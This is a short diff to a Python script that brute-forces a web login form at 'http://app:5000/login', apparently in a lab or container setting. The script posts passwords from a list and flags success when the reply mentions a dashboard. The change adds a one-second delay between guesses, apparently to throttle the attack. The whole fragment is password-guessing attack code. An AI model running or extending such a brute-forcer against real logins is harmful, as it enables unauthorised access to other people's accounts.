@@ -1,4 +1,4 @@
-import requests
+import requests, time
 
 URL = "http://app:5000/login"
 
@@ -32,6 +32,7 @@ for password in password_list:
     r = requests.post(URL, data=data)
 
     print(f"Trying: {password} | Status: {r.status_code}")
+    time.sleep(1)
 
     if "dashboard" in r.text.lower():
         print(f"[SUCCESS] Password found: {password}")
